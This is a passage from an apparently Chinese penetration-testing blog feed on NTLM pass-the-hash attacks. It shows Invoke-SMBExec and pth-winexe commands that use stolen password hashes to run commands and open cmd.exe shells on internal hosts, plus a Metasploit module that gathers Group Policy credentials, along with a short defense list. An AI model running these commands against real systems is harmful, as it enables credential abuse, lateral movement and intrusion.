signing</p><p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p><p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="string">"notepad.exe"</span> -verbose</span><br></pre></td></tr></table></figure><h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure><h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p><ul><li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li><li>如无特殊需要，建议配置防火墙规则禁止139和445端口</li></ul><h3 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h3><ul><li>内网欺骗劫持</li><li>钓鱼文件</li><li>后门命令</li><li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li><li><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></li><li>获取域控</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; run post/windows/gather/credentials/gpp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;转载自:&lt;/strong&gt;&lt;a href=&quot;https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ssooking.gith
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="NTML" scheme="https://shu1l.github.io/tags/NTML/"/>
    
  </entry>
  
</feed>
